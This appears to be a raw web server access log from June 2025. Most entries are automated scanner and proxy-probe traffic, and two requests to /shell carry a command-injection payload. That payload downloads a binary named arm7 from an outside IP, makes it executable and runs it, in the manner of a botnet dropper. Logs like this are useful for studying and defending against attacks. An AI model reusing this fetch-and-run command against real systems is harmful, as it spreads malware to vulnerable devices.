199.204.97.58 - - [19/Jun/2025:21:36:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:21:47:25 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:21:50:12 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:21:52:26 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
118.123.1.40 - - [19/Jun/2025:22:01:07 +0000] "GET /ips/index.php HTTP/1.1" 404 27 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [19/Jun/2025:22:01:07 +0000] "GET /public/stylesheets/theme.css HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [19/Jun/2025:22:01:07 +0000] "GET /chs/js/lang_zh_tw.js HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [19/Jun/2025:22:01:08 +0000] "GET /customer/js/lang_zh_tw.js HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [19/Jun/2025:22:01:08 +0000] "GET /stylesheets/theme.css HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [19/Jun/2025:22:01:08 +0000] "GET /index.php HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [19/Jun/2025:22:01:08 +0000] "GET /index.php HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [19/Jun/2025:22:01:08 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
149.50.103.48 - - [19/Jun/2025:22:03:21 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:22:03:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
185.93.89.118 - - [19/Jun/2025:22:15:20 +0000] "POST /api/v1/validate/code HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:22:17:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
141.98.11.83 - - [19/Jun/2025:22:18:17 +0000] "GET /shell?rm arm7;wget http://94.26.90.251/arm7;chmod 777 arm7;./arm7 arm7 HTTP/1.1" 400 157 "-" "-"
20.12.240.188 - - [19/Jun/2025:22:20:16 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 zgrab/0.x"
199.204.97.58 - - [19/Jun/2025:22:30:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:22:33:38 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
81.19.223.146 - - [19/Jun/2025:22:41:49 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xD9\xCDa\x12\x06rc\xFB\xA3\x07g\xCE\x80\xF4H\x81\x95\xB0\x8DTG\xE8\xEB\x89\xA8\x80lW\xC0M\x9A\x9F \xDF\xD0i\xA5\x81\x9Bh\xD5\x99\x03K\xE8\xA2Y\xB90t$\x08\x8E\x8C\xF6i\x010d\xCE\xBDq\x995n\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:22:44:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
59.82.21.35 - - [19/Jun/2025:22:48:22 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3449.16 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:22:57:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:23:01:38 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:23:11:12 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
